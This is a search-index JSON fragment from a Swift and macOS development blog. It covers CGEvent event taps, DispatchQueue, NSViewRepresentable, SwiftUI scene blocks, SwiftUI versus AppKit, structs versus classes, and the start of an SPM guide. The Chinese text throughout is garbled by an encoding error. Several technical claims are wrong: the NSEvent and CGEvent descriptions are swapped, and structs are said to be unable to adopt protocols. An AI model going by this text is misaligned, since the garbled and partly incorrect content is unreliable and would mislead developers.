è·¨å¹³å°æ”¯æŒ(æ¡Œé¢/ç§»åŠ¨) ä¸€äº›åº“å¯¹è±¡/å‡½æ•° NSEvent æ˜¯Core Graphicsæ¡†æ¶æä¾›çš„äº‹ä»¶å¤„ç†ç±»ã€‚ ä¸€ä¸ªæ¯”è¾ƒåº•å±‚çš„äº‹ä»¶ç±», ç”¨äºå¤„ç†ä¸å›¾å½¢æ¸²æŸ“å’Œçª—å£æœåŠ¡ç›¸å…³çš„äº‹ä»¶ã€‚ CGEventå¯ä»¥ç”¨äºæ¨¡æ‹Ÿå’Œå¤„ç†é¼ æ ‡ã€é”®ç›˜ã€è§¦æ‘¸ç­‰ä½çº§è¾“å…¥äº‹ä»¶ã€‚ å®ƒæä¾›äº†æ›´åº•å±‚çš„æ§åˆ¶ï¼Œå¯ä»¥ç›´æ¥æ“ä½œäº‹ä»¶çš„å±æ€§ï¼Œå¦‚ä½ç½®ã€æŒ‰é”®çŠ¶æ€ç­‰ã€‚ CGEvent AppKitæ¡†æ¶æä¾›çš„äº‹ä»¶å¤„ç†ç±». æ˜¯ä¸€ä¸ªè¾ƒé«˜å±‚çš„äº‹ä»¶å¤„ç†æ¥å£ï¼Œç”¨äºå¤„ç†ä¸åº”ç”¨ç¨‹åºç•Œé¢å’Œç”¨æˆ·äº¤äº’ç›¸å…³çš„äº‹ä»¶ã€‚ NSEventæä¾›äº†ä¸€äº›é«˜çº§çš„åŠŸèƒ½ï¼Œå¦‚è‡ªåŠ¨å¤„ç†æŒ‰é”®é‡å¤ã€å¤šç‚¹è§¦æ§ã€æ‰‹åŠ¿è¯†åˆ«ç­‰ã€‚ å®ƒè¿˜æä¾›äº†æ›´é«˜çº§çš„äº‹ä»¶å¤„ç†æ–¹æ³•ï¼Œå¦‚å“åº”é“¾ã€äº‹ä»¶åˆ†å‘ç­‰ã€‚ CGEvent.tapCreate åˆ›å»ºä¸€ä¸ªäº‹ä»¶æˆªå–, å‚è€ƒ: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate å‚æ•°åˆ—è¡¨: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? ä¸»è¦è¯´ä¸€ä¸‹ eventsOfInterest: CGEventMask , è¿™ä¸ªæ˜¯ä¸€ä¸ªä½æ©ç é›†åˆ, æ ‡è¯†æˆªå–çš„äº‹ä»¶ç±»å‹, æ¯”å¦‚ CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) , å¤šä¸ªäº‹ä»¶ç”¨ | æ•´åˆ. å·¦ç§»ä¸€ä½è¡¨ç¤ºè½¬æ¢ä¸ºä½æ©ç  å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°Callableæ˜¯ä¸ªå›è°ƒå‡½æ•°, ç”¨äºå¤„ç†äº‹ä»¶ éœ€è¦è¿”å›ä¸€ä¸ªcgEventçš„æŒ‡é’ˆ(), å‡½æ•°ç­¾åä¸º CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (è¿”å›ä¸€ä¸ªCGEventRefå¯¹è±¡ï¼Œå³ä¸€ä¸ªCGEventç±»å‹çš„å¼•ç”¨) å›è°ƒå‡½æ•°è´Ÿè´£åˆ›å»ºå’Œè¿”å›CGEventRefå¯¹è±¡ï¼Œå¹¶æ§åˆ¶å¯¹è¯¥å¯¹è±¡çš„å†…å­˜ç®¡ç† å›è°ƒè¿”å›çš„cgEventæœ‰ä¸¤ä¸ªå¯ç”¨çš„ä¿®é¥°: passRetainedï¼šåœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œå¦‚æœä½ ä½¿ç”¨passRetainedæ¥è¿”å›CGEventRefå¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºä½ å°†å†…å­˜ç®¡ç†æƒè½¬ç§»ç»™è°ƒç”¨æ–¹ã€‚ è¿™æ„å‘³ç€ï¼Œè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£åœ¨é€‚å½“çš„æ—¶å€™è°ƒç”¨CFReleaseæ¥é‡Šæ”¾CGEventRefå¯¹è±¡ï¼Œä»¥ç¡®ä¿æ­£ç¡®é‡Šæ”¾å†…å­˜å¹¶é¿å…å†…å­˜æ³„æ¼ã€‚ è¿™é€šå¸¸é€‚ç”¨äºä½ åœ¨å›è°ƒå‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„CGEventRefå¯¹è±¡ï¼Œå¹¶å¸Œæœ›è°ƒç”¨æ–¹è´Ÿè´£ç®¡ç†å…¶ç”Ÿå‘½å‘¨æœŸã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨CGEventCreateCopyå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„äº‹ä»¶å‰¯æœ¬ï¼Œå¹¶é€šè¿‡passRetainedè¿”å›ï¼Œ é‚£ä¹ˆè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£åœ¨ä¸å†éœ€è¦è¯¥äº‹ä»¶æ—¶è°ƒç”¨CFReleaseæ¥é‡Šæ”¾å®ƒã€‚ passUnretainedï¼šåœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œå¦‚æœä½ ä½¿ç”¨passUnretainedæ¥è¿”å›CGEventRefå¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºä½ ä¸ä¼šè½¬ç§»å†…å­˜ç®¡ç†æƒç»™è°ƒç”¨æ–¹ã€‚ è¿™æ„å‘³ç€ï¼Œè°ƒç”¨æ–¹ä¸éœ€è¦è°ƒç”¨CFReleaseé‡Šæ”¾CGEventRefå¯¹è±¡ï¼Œå› ä¸ºä½ ä¿ç•™äº†å¯¹è¯¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚ è¿™é€šå¸¸é€‚ç”¨äºä½ åœ¨å›è°ƒå‡½æ•°ä¸­è¿”å›äº†ä¸€ä¸ªæŒ‡å‘å…¨å±€æˆ–é™æ€å˜é‡çš„CGEventRefå¯¹è±¡ï¼Œ æˆ–è€…ä½ ä»å…¶ä»–åœ°æ–¹è·å–çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨å›è°ƒå‡½æ•°ä¸­åˆ›å»ºçš„æ–°å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨å›è°ƒå‡½æ•°ä¸­è¿”å›ä¸€ä¸ªå…¨å±€å˜é‡ä¸­å­˜å‚¨çš„äº‹ä»¶å¯¹è±¡ï¼Œæˆ–è€…ä½ é€šè¿‡ä¼ é€’æŒ‡é’ˆå‚æ•°è·å–ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œ ç„¶åä½¿ç”¨passUnretainedè¿”å›ï¼Œé‚£ä¹ˆè°ƒç”¨æ–¹ä¸éœ€è¦è°ƒç”¨CFReleaseé‡Šæ”¾å®ƒã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œä½¿ç”¨passRetainedè¡¨ç¤ºä½ å°†å†…å­˜ç®¡ç†æƒè½¬ç§»ç»™è°ƒç”¨æ–¹ï¼Œè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£é‡Šæ”¾å¯¹è±¡ã€‚ è€Œä½¿ç”¨passUnretainedè¡¨ç¤ºä½ ä¿ç•™äº†å†…å­˜ç®¡ç†æƒï¼Œè°ƒç”¨æ–¹æ— éœ€é‡Šæ”¾å¯¹è±¡ã€‚ ä½ åº”æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©é€‚å½“çš„å†…å­˜ç®¡ç†æ–¹å¼ï¼Œä»¥ç¡®ä¿æ­£ç¡®å¤„ç†å†…å­˜ç”Ÿå‘½å‘¨æœŸã€‚ (è¿™éƒ¨åˆ†æ¥è‡ªAI) æ³¨è§£ å¦å¤–è‡ªå·±ä½¿ç”¨ CGEvent æ—¶, å°½é‡ä¸è¦å»å¼ºè½¬ä¸º NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), å› ä¸ºæœ‰æ—¶å€™åœ¨è¿™è½¬äº†å, è¿”å›çš„cgEvent, åœ¨åº•å±‚è°ƒç”¨å¯èƒ½ä¼šæŠ¥é”™: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 ... com.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue æ‰§è¡Œä»»åŠ¡çš„è°ƒåº¦é˜Ÿåˆ—, æ”¯æŒå¼‚æ­¥æ‰§è¡Œ DispatchQueue æ˜¯ä¸€ä¸ªç”¨äºæ‰§è¡Œä»»åŠ¡çš„è°ƒåº¦é˜Ÿåˆ—ï¼Œå®ƒæ˜¯åœ¨Grand Central Dispatch (GCD) ä¸­æä¾›çš„ä¸»è¦ç±»ä¹‹ä¸€ã€‚ GCDæ˜¯ä¸€ä¸ªç”¨äºå¹¶å‘æ‰§è¡Œä»»åŠ¡çš„åº•å±‚ç³»ç»Ÿæ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸€ç§ç®€å•è€Œå¼ºå¤§çš„æ–¹å¼æ¥ç®¡ç†å¹¶å‘ä»»åŠ¡çš„æ‰§è¡Œã€‚ DispatchQueue å¯ä»¥å°†ä»»åŠ¡ï¼ˆä»£ç å—ï¼‰å®‰æ’åˆ°ä¸åŒçš„é˜Ÿåˆ—ä¸­ï¼Œå¹¶æŒ‰ç…§ç‰¹å®šçš„è°ƒåº¦æ–¹å¼è¿›è¡Œæ‰§è¡Œã€‚å®ƒæä¾›äº†ä¸¤ç§ç±»å‹çš„é˜Ÿåˆ—ï¼š Serial Queueï¼ˆä¸²è¡Œé˜Ÿåˆ—ï¼‰ï¼šæ¯æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡ï¼ŒæŒ‰ç…§ä»»åŠ¡æ·»åŠ çš„é¡ºåºè¿›è¡Œæ‰§è¡Œã€‚åä¸€ä¸ªä»»åŠ¡ä¼šç­‰å¾…å‰ä¸€ä¸ªä»»åŠ¡å®Œæˆåæ‰èƒ½å¼€å§‹æ‰§è¡Œã€‚ Concurrent Queueï¼ˆå¹¶å‘é˜Ÿåˆ—ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼Œå¹¶ä¸”ä»»åŠ¡çš„æ‰§è¡Œé¡ºåºå¯èƒ½ä¸ç¡®å®šã€‚ ä½ å¯ä»¥ä½¿ç”¨ DispatchQueue æ¥æ‰§è¡Œä»¥ä¸‹ç±»å‹çš„ä»»åŠ¡ï¼š åŒæ­¥ä»»åŠ¡ï¼ˆSync Tasksï¼‰ï¼šä»»åŠ¡ä¼šåœ¨å½“å‰çº¿ç¨‹ä¸­åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åæ‰ä¼šç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚ å¼‚æ­¥ä»»åŠ¡ï¼ˆAsync Tasksï¼‰ï¼šä»»åŠ¡ä¼šåœ¨åå°çº¿ç¨‹ä¸­å¼‚æ­¥æ‰§è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹çš„æ‰§è¡Œï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ DispatchQueue çš„ç®€å•ç¤ºä¾‹: let queue = DispatchQueue(label: \"com.example.queue\") // å¼‚æ­¥ä»»åŠ¡ queue.async { // åœ¨åå°çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ print(\"å¼‚æ­¥ä»»åŠ¡\") } // åŒæ­¥ä»»åŠ¡ queue.sync { // åœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ print(\"åŒæ­¥ä»»åŠ¡\") } DispatchQueue è¿˜æä¾›äº†å…¶ä»–åŠŸèƒ½ï¼Œå¦‚å»¶è¿Ÿæ‰§è¡Œä»»åŠ¡ã€è°ƒåº¦ä»»åŠ¡åœ¨ç‰¹å®šæ—¶é—´æˆ–é—´éš”åæ‰§è¡Œç­‰ã€‚ å®ƒæ˜¯åœ¨iOSã€macOSã€watchOS å’Œ tvOS å¼€å‘ä¸­è¿›è¡Œå¼‚æ­¥å’Œå¹¶å‘ç¼–ç¨‹çš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ æ¯”å¦‚å»¶æ—¶æ‰§è¡Œä¹Ÿå¯ä»¥: // å»¶æ—¶æ‰§è¡Œä»»åŠ¡ DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { // 2ç§’åæ‰§è¡Œçš„ä»»åŠ¡ print(\"å»¶æ—¶æ‰§è¡Œçš„ä»»åŠ¡\") } NSViewRepresentable ä¸€ä¸ªåè®®ï¼Œç”¨äºåœ¨SwiftUIä¸­å°è£…å’Œä½¿ç”¨Cocoaï¼ˆmacOSï¼‰ä¸­çš„NSViewã€‚ å®ƒå…è®¸å¼€å‘è€…é€šè¿‡å®ç°ä¸€äº›å¿…è¦çš„æ–¹æ³•æ¥åˆ›å»ºè‡ªå®šä¹‰çš„NSViewï¼Œå¹¶å°†å…¶åµŒå…¥åˆ°SwiftUIè§†å›¾å±‚çº§ä¸­ã€‚ é€šè¿‡éµå¾ªNSViewRepresentableåè®®ï¼Œ ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªéµå¾ªNSViewRepresentableåè®®çš„è‡ªå®šä¹‰ç»“æ„ä½“æˆ–ç±»ï¼Œç„¶åå®ç°ä»¥ä¸‹ä¸¤ä¸ªå¿…è¦çš„æ–¹æ³•ï¼š makeNSView(context:)ï¼šåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä½ éœ€è¦åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªNSViewå®ä¾‹ã€‚è¿™ä¸ªæ–¹æ³•ä¼šåœ¨è§†å›¾ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºæ—¶è°ƒç”¨ã€‚ updateNSView(_:context:)ï¼šåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦æ›´æ–°NSViewçš„å±æ€§å’Œå†…å®¹ã€‚è¿™ä¸ªæ–¹æ³•ä¼šåœ¨è§†å›¾çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶è¢«è°ƒç”¨ã€‚ é€šè¿‡å®ç°è¿™äº›æ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨SwiftUIä¸­ä½¿ç”¨è‡ªå®šä¹‰çš„NSViewï¼Œ å¹¶åœ¨å…¶ä¸­ä½¿ç”¨Cocoaï¼ˆmacOSï¼‰æä¾›çš„å„ç§åŠŸèƒ½å’Œæ§ä»¶ï¼Œä»¥æ»¡è¶³ç‰¹å®šçš„éœ€æ±‚ã€‚ View è§†å›¾é¡¶çº§çª—å£, æ³¨æ„, æ²¡æœ‰æä¾›é»˜è®¤çš„closeæ–¹æ³•, å› ä¸ºå®˜æ–¹è§‰å¾—closeä¸åº”è¯¥ç”±Viewè§¦å‘ å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è·å–åˆ°Viewæ‰€åœ¨çª—ä½“ç„¶åå…³é—­: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKitçš„çª—å£ç®¡ç† NSHostingController AppKit ä¸­çš„ç±»ï¼Œç”¨äºåœ¨ macOS åº”ç”¨ç¨‹åºä¸­æ‰¿è½½ SwiftUI è§†å›¾ã€‚ å®ƒæ˜¯ä¸€ä¸ª AppKit è§†å›¾æ§åˆ¶å™¨ï¼Œç”¨äºåœ¨ AppKit åº”ç”¨ç¨‹åºä¸­æ‰˜ç®¡å’Œç®¡ç† SwiftUI è§†å›¾ã€‚ é€šè¿‡å°† SwiftUI è§†å›¾åµŒå…¥åˆ° NSHostingController ä¸­ï¼Œå¯ä»¥åœ¨ AppKit åº”ç”¨ç¨‹åºçš„è§†å›¾å±‚æ¬¡ç»“æ„ä¸­ä½¿ç”¨ SwiftUI è§†å›¾ã€‚ ZStackä¸VStack ZStack ä¸€ä¸ª3Dçš„å¸ƒå±€æ–¹å¼, æ¯”å¦‚æœ‰ä¸‰ä¸ªå›¾æ ‡, åè€…ä¼šå æ”¾åœ¨å‰è€…ä¸Š VStack å‚ç›´å¸ƒå±€æ–¹å¼, æ¯”å¦‚æœ‰ä¸‰ä¸ªå›¾æ ‡, åè€…ä¼šå‚ç›´æ’åˆ—ä¸å‰è€… æ”¯æŒçš„å— Settings å— ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„è®¾ç½®åœºæ™¯ï¼Œå®ƒæ˜¯ä¸€ä¸ªè§†å›¾æ„é€ å™¨ï¼Œç”¨äºè‡ªå®šä¹‰åº”ç”¨ç¨‹åºçš„è®¾ç½®ç•Œé¢ã€‚ é€šè¿‡åœ¨ Settings å—ä¸­æ·»åŠ è§†å›¾æ¥åˆ›å»ºè‡ªå®šä¹‰çš„è®¾ç½®ç•Œé¢ï¼Œä»¥ä¾›ç”¨æˆ·é…ç½®å’Œè°ƒæ•´åº”ç”¨ç¨‹åºçš„å„ç§é€‰é¡¹ã€‚ WindowGroup å— WindowGroup å—ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„ä¸»çª—å£åœºæ™¯ã€‚ åœ¨ WindowGroup å—ä¸­ï¼Œä½ å¯ä»¥æŒ‡å®šåº”ç”¨ç¨‹åºçš„ä¸»çª—å£çš„å†…å®¹è§†å›¾ä»¥åŠå…¶ä»–ä¸çª—å£ç›¸å…³çš„å±æ€§ã€‚ Scene å— Scene å—ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„åœºæ™¯ï¼Œå®ƒå¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªçª—å£ç»„ã€‚ ä½ å¯ä»¥åœ¨ Scene å—ä¸­å®šä¹‰åº”ç”¨ç¨‹åºçš„åœºæ™¯é…ç½®ã€çª—å£ç®¡ç†å’Œç”Ÿå‘½å‘¨æœŸå¤„ç†ã€‚ NavigationView å— NavigationView å—ç”¨äºåˆ›å»ºå…·æœ‰å¯¼èˆªåŠŸèƒ½çš„è§†å›¾å±‚æ¬¡ç»“æ„ã€‚ åœ¨ NavigationView å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ NavigationView çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰å¯¼èˆªæ ã€å¯¼èˆªé“¾æ¥ä»¥åŠå…¶ä»–ä¸å¯¼èˆªç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ Form å— Form å—ç”¨äºåˆ›å»ºè¡¨å•è§†å›¾ï¼Œç”¨äºæ˜¾ç¤ºå’Œæ”¶é›†ç”¨æˆ·çš„è¾“å…¥ã€‚ åœ¨ Form å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ Form çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥åˆ›å»ºè¡¨å•å­—æ®µã€åˆ†ç»„å’Œå…¶ä»–ä¸è¡¨å•ç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ List å— List å—ç”¨äºåˆ›å»ºå¯æ»šåŠ¨çš„åˆ—è¡¨è§†å›¾ã€‚ åœ¨ List å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ List çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰åˆ—è¡¨é¡¹ã€åˆ†ç»„å’Œå…¶ä»–ä¸åˆ—è¡¨ç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ ForEach å— ForEach å—ç”¨äºåœ¨åˆ—è¡¨æˆ–è§†å›¾ä¸­è¿­ä»£å’Œæ˜¾ç¤ºé›†åˆä¸­çš„å…ƒç´ ã€‚ åœ¨ ForEach å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ ForEach çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰æ¯ä¸ªå…ƒç´ çš„æ˜¾ç¤ºæ–¹å¼å’Œäº¤äº’è¡Œä¸ºã€‚ SwiftUI ä¸ AppKit SwiftUI å’Œ AppKit æ˜¯ Apple æä¾›çš„ä¸¤ä¸ªä¸åŒçš„æ¡†æ¶ï¼Œ ç”¨äºæ„å»º macOS åº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢ã€‚å®ƒä»¬åœ¨è®¾è®¡å’Œå¼€å‘ç†å¿µä¸Šæœ‰ä¸€äº›åŒºåˆ«ã€‚ å£°æ˜æ€§ UIï¼šSwiftUI æ˜¯ä¸€ä¸ªåŸºäºå£°æ˜æ€§ UI çš„æ¡†æ¶ï¼Œ å®ƒä½¿ç”¨ç®€æ´çš„ä»£ç å’Œå£°æ˜å¼çš„æ–¹å¼æ¥æè¿°ç”¨æˆ·ç•Œé¢ã€‚ ä½ å¯ä»¥ä½¿ç”¨ SwiftUI çš„å„ç§è§†å›¾å’Œä¿®é¥°ç¬¦æ¥æ„å»ºç”¨æˆ·ç•Œé¢ï¼Œ å¹¶ä¸”å®ƒä¼šè‡ªåŠ¨å¤„ç†è§†å›¾çŠ¶æ€å’Œå¸ƒå±€ï¼Œä»¥åŠä¸ç”¨æˆ·äº¤äº’çš„å“åº”ã€‚ è€Œ AppKit æ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤å¼çš„ UI æ¡†æ¶ï¼Œä½ éœ€è¦ç¼–å†™æ›´å¤šçš„ä»£ç æ¥æ‰‹åŠ¨ç®¡ç†è§†å›¾çš„çŠ¶æ€å’Œå¸ƒå±€ã€‚ è·¨å¹³å°æ”¯æŒï¼šSwiftUI æ˜¯ä¸€ä¸ªè·¨å¹³å°æ¡†æ¶ï¼Œ é™¤äº† macOSï¼Œå®ƒè¿˜å¯ä»¥ç”¨äºæ„å»º iOSã€iPadOSã€watchOS å’Œ tvOS åº”ç”¨ç¨‹åºã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ä»£ç å’ŒæŠ€æœ¯æ¥å¼€å‘å¤šä¸ªå¹³å°ä¸Šçš„åº”ç”¨ç¨‹åºã€‚ è€Œ AppKit æ˜¯ä¸“é—¨ä¸º macOS è®¾è®¡çš„æ¡†æ¶ï¼Œä¸æ”¯æŒå…¶ä»–å¹³å°ã€‚ å“åº”å¼å¸ƒå±€ï¼šSwiftUI çš„å¸ƒå±€ç³»ç»Ÿæ˜¯å“åº”å¼çš„ï¼Œ å®ƒä½¿ç”¨äº†ä¸€ç§å«åš \"å®¹å™¨è§†å›¾\" çš„æ¦‚å¿µï¼Œå¯ä»¥è‡ªåŠ¨é€‚åº”ä¸åŒçš„å±å¹•å°ºå¯¸å’Œè®¾å¤‡æ–¹å‘ã€‚ è¿™ä½¿å¾—å¼€å‘é€‚åº”æ€§æ›´å¼ºçš„ç”¨æˆ·ç•Œé¢å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ AppKit çš„å¸ƒå±€ç³»ç»Ÿç›¸å¯¹è¾ƒä¸ºä¼ ç»Ÿï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†ä¸åŒçš„å±å¹•å°ºå¯¸å’Œè®¾å¤‡æ–¹å‘ã€‚ é¢„è§ˆåŠŸèƒ½ï¼šSwiftUI æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„é¢„è§ˆåŠŸèƒ½ï¼Œå¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å®æ—¶é¢„è§ˆå’Œè°ƒè¯•ç”¨æˆ·ç•Œé¢ã€‚ ä½ å¯ä»¥åœ¨ Xcode ä¸­æŸ¥çœ‹ SwiftUI è§†å›¾åœ¨ä¸åŒè®¾å¤‡ä¸Šçš„å¤–è§‚ï¼Œå¹¶å³æ—¶æŸ¥çœ‹ä»£ç æ›´æ”¹çš„æ•ˆæœã€‚ è¿™å¯¹äºè¿­ä»£å¼€å‘å’Œå¿«é€Ÿè°ƒè¯•éå¸¸æœ‰å¸®åŠ©ã€‚AppKit å¹¶æ²¡æœ‰æä¾›ç±»ä¼¼çš„é¢„è§ˆåŠŸèƒ½ã€‚ å°½ç®¡ SwiftUI åœ¨è®¾è®¡ä¸Šæœ‰ä¸€äº›æ–°é¢–çš„æ¦‚å¿µå’Œä¼˜åŠ¿ï¼Œ ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»ç„¶éœ€è¦ä½¿ç”¨ AppKit æ¥æ„å»ºæ›´å¤æ‚å’Œå®šåˆ¶åŒ–çš„ macOS åº”ç”¨ç¨‹åºã€‚ AppKit æ‹¥æœ‰æ›´å¤šçš„åŠŸèƒ½å’Œçµæ´»æ€§","tags":"åç«¯; swift","url":"/yq-backend-swift-course-lib.html","loc":"/yq-backend-swift-course-lib.html"},{"title":"swiftç»“æ„ä½“ä¸ç±»çš„ä½¿ç”¨åŒºåˆ«","text":"ç»“æ„ä½“: å€¼ç±»å‹, å½“ä½ åˆ›å»ºç»“æ„ä½“çš„å®ä¾‹æ—¶ï¼Œå®ƒä¼šåˆ›å»ºè¯¥ç»“æ„çš„æ·±æ‹·è´; å³ä½¿å°†å…¶èµ‹å€¼ç»™å…¶ä»–å˜é‡, ä¹Ÿæ˜¯åˆ›å»ºä¸€ä¸ªå€¼çš„æ‹·è´ ç»“æ„ä½“çš„æˆå‘˜é»˜è®¤æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰ï¼Œé™¤éä½ æ˜ç¡®åœ°ä½¿ç”¨å…³é”®å­—mutatingæ¥æ ‡è®° ç»“æ„ä½“ä¸èƒ½ç»§æ‰¿è‡ªå…¶ä»–ç»“æ„ä½“æˆ–ç±»ï¼Œä¹Ÿä¸èƒ½å®ç°åè®®ï¼ˆprotocolï¼‰ã€‚ ä½†æ˜¯ï¼Œä½ å¯ä»¥åœ¨ç»“æ„ä½“ä¸­å®šä¹‰ä¸€ä¸ªåä¸ºinitçš„å‡½æ•°æ¥å®ç°åˆå§‹åŒ–é€»è¾‘ã€‚ ç±» å¼•ç”¨ç±»å‹, å½“ä½ åˆ›å»ºç±»çš„å®ä¾‹æ—¶ï¼Œå®ƒåˆ›å»ºçš„æ˜¯å¯¹ç±»ç±»å‹çš„å¼•ç”¨(å¤šä¸ªå¼•ç”¨æ‰§è¡ŒåŒä¸€ä¸ªå€¼) ç±»çš„æˆå‘˜é»˜è®¤æ˜¯å¯å˜çš„ï¼ˆmutableï¼‰ ç±»å¯ä»¥ç»§æ‰¿è‡ªå…¶ä»–ç±»æˆ–å®ç°åè®® ä½¿ç”¨åœºæ™¯ ç»“æ„ä½“ï¼šç»“æ„ä½“é€šå¸¸ç”¨äºè¡¨ç¤ºç®€å•çš„æ•°æ®æ¨¡å‹ï¼Œ å¦‚å‡ ä½•å½¢çŠ¶æˆ–è´§å¸å•ä½ï¼Œå…¶ä¸­é‡ç‚¹æ˜¯æ•°æ®è€Œä¸æ˜¯è¡Œä¸ºã€‚ ç»“æ„ä½“çš„è¡Œä¸ºé€šå¸¸é€šè¿‡å‡½æ•°å’Œè®¡ç®—å±æ€§æ¥å®šä¹‰ã€‚ ç±»ï¼šç±»é€šå¸¸ç”¨äºè¡¨ç¤ºæ›´å¤æ‚çš„æ¦‚å¿µï¼Œ å¦‚äººç±»ã€åŠ¨ç‰©æˆ–æ±½è½¦ç­‰ï¼Œå…¶ä¸­é‡ç‚¹æ˜¯è¡Œä¸ºå’ŒçŠ¶æ€ã€‚ ç±»å¯ä»¥æ‹¥æœ‰å®ä¾‹æ–¹æ³•å’Œç±»æ–¹æ³•ï¼Œä»¥åŠå±æ€§ï¼ˆå¯ä»¥æ˜¯å¯å˜çš„æˆ–ä¸å¯å˜çš„ï¼‰ã€‚","tags":"åç«¯; swift","url":"/yq-backend-swift-issuse-diff-with-class-struct.html","loc":"/yq-backend-swift-issuse-diff-with-class-struct.html"},{"title":"ä½¿ç”¨SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) æ³¨è§£ æºäºAI, æœ‰ç©ºæ•´ç† å¦‚æœä½ æƒ³åœ¨ Swift Package Manager (SPM) ä¸­å¯¼å…¥ C ä»£ç ï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š åˆ›å»º Swift åŒ… åœ¨ä½ çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œæ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ã€‚ ä½¿ç”¨ cd å‘½ä»¤å¯¼èˆªåˆ°ä½ çš„é¡¹ç›®ç›®å½•ã€‚ è¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ Swift åŒ…: swift package init æˆ–è€…ç›´æ¥åœ¨xcodeåˆ›å»º é…ç½® Swift åŒ… åœ¨é¡¹ç›®ç›®å½•ä¸­ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ Package.swift æ–‡ä»¶ã€‚ åœ¨ Package.swift æ–‡ä»¶ä¸­ï¼Œé…ç½® Swift åŒ…çš„åç§°ã€ç›®æ ‡å’Œä¾èµ–é¡¹ç­‰ä¿¡æ¯ã€‚ åœ¨ targets æ•°ç»„ä¸­ï¼Œå®šä¹‰ä½ çš„ç›®æ 